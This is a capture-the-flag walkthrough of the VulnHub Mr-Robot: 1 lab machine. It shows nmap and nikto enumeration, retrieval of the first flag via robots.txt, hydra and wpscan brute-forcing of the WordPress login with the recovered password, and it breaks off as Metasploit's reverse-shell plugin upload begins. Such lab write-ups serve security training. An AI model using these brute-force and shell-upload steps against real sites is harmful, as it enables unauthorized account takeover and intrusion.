[Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) has 3 flags to find.

## Preparation

The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.

On the isolated internal network, a VirtualBox DHCP server assigns IP addresses to the machines:

```sh
marci@arch$ vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
```

The **Kali** machine received the IP address `10.38.1.110`.

Launching **Mr. Robot**, we're presented with a login screen that cannot be bypassed as the login credentials aren't known.

## Enumeration

### Nmap

**Nmap** can be used to discover the vulnerable machine on the network:

```sh
kali@kali$ nmap -sS -T4 10.38.1.110-120
```

```

```

**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111` and with TCP ports `80` (http) and `443` (https) open.

Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the Mr. Robot TV series.

## 1st Flag

**Nikto** can be used to gather further information about the web server.

```

```

1. The server leaks inodes via ETags and a header has been found with file **/robots.txt**

```

```

  2. The server is running **Wordpress**

```

```

> A [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro) file tells search engine crawlers which URLs the crawler can access on your site.
> This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.

**robots.txt** indicates that the server doesn't have an user agent but it has two files:

- fsocity.dic
- key-1-of-3.txt

**wget** can be used to download the files:

```sh
kali@kali$ wget 10.38.1.111/fsocity.dic
kali@kali$ wget 10.38.1.111/key-1-of-3.txt
```

```sh
kali@kali$ cat key-1-of-3.txt

```

## 2nd Flag

As SSL isn't enabled on the Wordpress login page, it may be bruteforced with the downloaded dictionary file.

`fsocity.dic` contains duplicated entries that should be removed.

```sh
kali@kali$ cat fsocity.dic | sort -u | uniq > wordlist.dic
```

The word count of the dictionary has decreased from `858160` to `11451`.

```
kali@kali$ wc -l fsocity.dic
858160 fsocity.dic
```

```
kali@kali$ wc -l wordlist.dic
11451 wordlist.dic
```

To start the bruteforce attack, we need to intercept an [http POST request](<https://en.wikipedia.org/wiki/POST_(HTTP)>) in [Burp Suite](https://portswigger.net/burp).

To do that, a manual proxy must be configured in the browser and Burp Suite should have the same Proxy Listener set:

- HTTP Proxy: `127.0.0.1`
- Port: `8080`

In the intercepted POST request - that has been sent to the server - we're looking for the `log`, `pwd`, and the `wp-submit` fields.

**hydra** can be used to guess the username:

```sh
kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

- `-V` — Verbose
- `-L fsocity.dic` — Define dictionary
- `-p 123` — Random unique password
- `10.38.1.111` — IP of the vulnerable machine
- `http-post-form` — An http POST form is being bruteforced
- `/wp-login.php` — Path where the form is located
- `log=^USER^&pwd=^PASS&wp-submit=Log+In` — POST parameters to send, including placeholders
- `F=Invalid Username` — Consider an attempt as failure if the response contains the text "Invalid Username".

### Hydra

**hydra** has found 3 possible usernames:

```sh
[80][http-post-form] host: 10.38.1.111 login: elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: Elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: ELLIOT password: 123
```

#### Wpscan

**wpscan** can be used to find additional WordPress vulnerabilities and to bruteforce the password using the word list.

```sh
kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
```

**wpscan** has found several outdated plugins and one valid username - password pair.

```sh
[+] performing password attach on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot - / ER28-0652
All Found
Progress Time: 00:00:19 <========================================================================

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

### Metasploit

**Metasploit** [WordPress Admin Shell Upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module creates a small WordPress plugin that connects back to the attacking machine and spawns a reverse shell.

```sh
kali@kali$ msfconsole
```
